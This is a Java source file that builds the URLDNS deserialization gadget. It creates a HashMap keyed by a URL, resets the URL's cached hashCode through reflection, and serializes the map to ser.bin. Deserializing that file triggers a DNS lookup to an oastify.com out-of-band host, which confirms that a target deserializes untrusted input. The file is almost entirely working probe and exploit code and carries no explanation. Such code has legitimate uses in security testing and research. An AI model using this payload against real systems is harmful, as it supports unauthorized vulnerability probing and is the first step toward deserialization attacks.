package com.example.urldns;

import java.io.*;
import java.lang.reflect.Field;
import java.net.*;
import java.util.HashMap;

public class Main {
    public static void main(String[] args) throws IOException, ClassNotFoundException, NoSuchFieldException, IllegalAccessException {
        HashMap ht=new HashMap();
        String url = "http://xtu23zlvbrt60860mj4zrotjpav1jv7k.oastify.com";
        URLStreamHandler handler = new TestURLStreamHandler();
        URL u = new URL(null,url,handler);
        ht.put(u,url);

        Class clazz = Class.forName("java.net.URL");
        Field field = clazz.getDeclaredField("hashCode");
        field.setAccessible(true);
        field.set(u,-1);

        Serialize(ht);
    }

    public static void Serialize(Object obj) throws IOException {
        ObjectOutputStream oos=new ObjectOutputStream(new FileOutputStream("ser.bin"));
        oos.writeObject(obj);
    }
    public static Object Unserialize(String Filename) throws IOException, ClassNotFoundException{
        ObjectInputStream ois = new ObjectInputStream(new FileInputStream(Filename));
        Object obj = ois.readObject();
        return obj;
    }
}
class TestURLStreamHandler extends URLStreamHandler {
    @Override
    protected URLConnection openConnection(URL u) throws IOException {
        return null;
    }
    @Override
    protected synchronized InetAddress getHostAddress(URL u) {
        return null;
    }
}